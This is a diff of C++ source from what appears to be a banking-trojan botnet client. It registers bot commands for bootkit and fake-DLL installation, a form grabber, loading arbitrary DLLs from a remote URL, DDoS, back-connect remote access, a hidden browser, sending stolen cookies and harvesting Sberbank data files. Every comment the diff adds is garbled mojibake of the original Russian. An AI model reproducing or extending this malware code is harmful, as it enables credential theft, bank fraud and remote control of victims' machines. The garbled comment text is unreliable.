+// <Target> - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ 
+//            пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
 bool ExecuteInstallFakeDll(void* Manager, PCHAR Command, PCHAR Args)
 {
-	// Установку длл разрешаем только в ринг3 и сервисе бота
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ3 пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	if (BOT::GetBotType() != BotRing3 && BOT::GetBotType() != BotService)
 		return false;
 
@@ -1334,7 +1345,7 @@ bool ExecuteInstallFakeDll(void* Manager, PCHAR Command, PCHAR Args)
 
 TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 {
-    // Выполнить стандартную команду
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	const static char CommandUpdate[]        = {'u','p','d','a','t','e',0};
 	const static char CommandUpdateConfig[]  = {'u','p','d','a','t','e','c','o','n','f','i','g' ,0};
@@ -1402,7 +1413,7 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
     default: ;
 	}
 
-	// Ищем команду в списке зарегистрированных
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Manager != NULL)
 	{
 		PRegisteredCommand Cmd = GetRegisteredCommand(Manager, Command);
@@ -1426,7 +1437,7 @@ const char* CommandUpdatePlug = "updateplug";
 
 void RegisterAllCommands(PTaskManager Manager, DWORD Commands)
 {
-	// Регистрируем известные команды бота
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	TASKDBG("RegisterAllCommands", "Started with Manager=0x%X Commands=%u", 
 		Manager, Commands);
 
@@ -1435,21 +1446,21 @@ void RegisterAllCommands(PTaskManager Manager, DWORD Commands)
 	{
 		RegisterCommand(Manager, GetStr(EStrCommandInstallBootkit).t_str(), ExecuteInstallBootkit);
 
-		// Команда установки Bootkit из плага
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Bootkit пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 //		RegisterCommand(Manager, (PCHAR)Plugin::CommandInstallBk, Plugin::ExecuteInstallBk);
 
-		// Команда установки Bootkit из плага c включением статистического отстука
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Bootkit пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ c пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //		RegisterCommand(Manager, (PCHAR)Plugin::CommandInstallBkStat, Plugin::ExecuteInstallBkStat);
     }
 
-	// Команда обновления плага
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	RegisterCommand(Manager, (PCHAR)CommandUpdatePlug, ExecuteUpdatePlug);
 
-	// Команда установки FakeDll
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ FakeDll
 	if (BOT::GetBotType() != BotFakeDll && BOT::GetBotType() != BotBootkit)
 		RegisterCommand(Manager, GetStr(EStrCommandInstallFakeDLL).t_str(), ExecuteInstallFakeDll);
 
-	// Команда grabber
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ grabber
 	#ifdef GrabberH
         RegisterCommand(Manager, (PCHAR)CommandGrabber, ExecuteGrabber);
 	#endif
@@ -1457,34 +1468,34 @@ void RegisterAllCommands(PTaskManager Manager, DWORD Commands)
 
 	//char CommandMultiDownload[] = {'m','u','l','t','i','d','o','w','n','l','o','a','d',0};
 
-	//можем грузить любую длл, какая нам нравиться
+	//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	//"loaddll decl:WINAPIV|dll.plug|StartHTTP|c-http://site.com'|i-2|"	
 	#ifdef ComandLoadDLLH		
 		RegisterCommand(Manager, (PCHAR)CommandLoadDllConnect, ExecuteAllCommand);		
 	#endif
 
 	//-------------------------------------------------
-	// Команда DDOS
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ DDOS
 	#ifdef ddosH		
 		RegisterCommand(Manager, (PCHAR)CommandDDOS, ExecuteDDOSCommand);		
 	#endif
 	
 
 	//-------------------------------------------------
-	// Команда Back Connect
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ Back Connect
 	#ifdef BackConnectH
         RegisterCommand(Manager, CommandBackConnect, ExecuteBackConnectCommand);
 	#endif
 
 	//-------------------------------------------------
-	// Команда скрытого браузера
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	#ifdef StealthBrowserH		
 		char CommandSB[] = {'s','b',0};  //sb 127.0.0.1 9999
 		RegisterCommand(Manager, CommandSB, ExecuteSBCommand);
     #endif
 
 	//-------------------------------------------------
-	// Команды для раблоты с куками
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	#ifdef coocksolH
 		RegisterCommand(Manager, (PCHAR)CommandDeleteCookies, ExecuteDeleteCookiesCommand);
 		RegisterCommand(Manager, (PCHAR)CommandSendCookies, ExecuteSendCookiesCommand);
@@ -1501,7 +1512,7 @@ void RegisterAllCommands(PTaskManager Manager, DWORD Commands)
 	#endif
 	//-------------------------------------------------
 
-	// собираем данные *.dat %Temp%
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ *.dat %Temp%
 	#ifdef		SBERH
 		//RegisterCommand(Manager, (PCHAR)GetSberLog, ExecuteGrabSberLogCommand);
 		RegisterCommand(Manager, (PCHAR)Sber::GetSbr, Sber::ExecuteGetSbrCommand);
